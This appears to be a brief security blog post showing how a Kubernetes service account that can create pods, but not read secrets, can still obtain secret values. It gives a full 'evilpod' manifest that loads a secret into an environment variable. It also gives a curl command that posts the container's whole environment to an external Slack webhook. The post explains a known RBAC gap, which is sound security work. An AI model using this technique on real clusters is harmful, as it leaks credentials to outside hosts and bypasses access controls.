---
title: Kubernetes Secrets and Pod Creation
categories: [Kubernetes]
---

# Stealing All Your Secrets

This is a really quick post to share something I noted yesterday about gaining access to Kubernetes secrets. If you don't have RBAC permissions to get or list secrets, but you can create pods, it's still possible to get a secret's value. This isn't a new thing, and it probably won't surprise anyone who's looked into K8S security before, but it was semi-interesting and if nothing else, building something to prove it worked was a good exercise. 

Let's say we have a secret:

~~~
apiVersion: v1
kind: Secret
metadata:
  name: superdupersecret
type: Opaque
data:
  SECRETVALUE: VGhpcyBpcyBteSBzdXBlciBzbmVha3kgc2VjcmV0IA==
  (This is my super sneaky secret)
~~~

That secret might be used by a pod to connect to a database, or just to exist as an example in some random internet blog post. 

~~~
ubuntu@ip-172-31-41-122:~$ kubectl get po -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
  <-- snip -->
  spec:
    containers:
    - env:
      - name: SECRET_VALUE
        valueFrom:
          secretKeyRef:
            key: SECRETVALUE
            name: superdupersecret
~~~

This is a little convoluted, but let's now let's imagine we had a service account that had a number of permissions, but **not** the ability to get secrets. For this example I've used the following RBAC config:

~~~
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-manipulator
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "create"]
~~~

In other words, anything bound to that role can list the existing pods and can create new ones. I wanted to avoid confusion around controller ServiceAccounts, so there's nothing fancy like deployments or replicasets or daemonsets. Using a newly created ServiceAccount bound to the "pod-manipulator" role above, I could list existing pods and use that to enumerate secrets from the running pods. This isn't necessarily a full list of secrets in the namespace, but there's a good chance it's all of the useful (or at least, those which are actively used). 

Armed with the names of these secrets, it's possible to create a new pod which populates an environmental variable and just dump the details out from a command like `env`, right?

(Note that the following commands were run from the serviceaccount created above, not the default Kind cluster-admin kubeconfig)

~~~
ubuntu@ip-172-31-41-122:~$ cat evilmanifest.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evilpod
spec:
  containers:
  - name: evilcontainer
    image: debian:latest
    env:
    - name: SECRET_VALUE
      valueFrom: 
        secretKeyRef:
          name: superdupersecret
          key: SECRETVALUE
    command: "env"

ubuntu@ip-172-31-41-122:~$ kubectl --kubeconfig=sa.kubeconfig get po
NAME      READY   STATUS             RESTARTS   AGE
evilpod   0/1     Completed          2          27s

ubuntu@ip-172-31-41-122:~$ kubectl --kubeconfig=sa.kubeconfig logs pod/evilpod
Error from server (Forbidden): pods "evilpod" is forbidden: User "system:serviceaccount:default:pod-manipulator" cannot get resource "pods/log" in API group "" in the namespace "default"
~~~

So that didn't work. Running the same `kubectl logs` command as cluster-admin shows that the environmental variables have been set correctly, but our lowly service account doesn't have the correct permissions to view the logs. Thankfully, there's a way around this, assuming your pod has network access back to your host or out to the internet. Enter webhooks! (At this point there are several options, webhooks just work as a nice demo.)

Let's rework the command the container runs, to perform a curl request rather than just dumping out the env variables. 

~~~
command: ["/bin/bash", "-c", "curl -X POST -H 'Content-type: application/json' --data \"{'text':'$(env)'}\" https://hooks.slack.com/services/ImnottellingyoumywebhookURL"]
~~~

![](/assets/images/webhook_secrets.png)

And there we have it! Env variable, complete with secret values, without the ability to list secrets from RBAC, which seems to be because the Kubelet has access to every secret, and it doesn't know or care what the original calling entity was when a pod was created. 
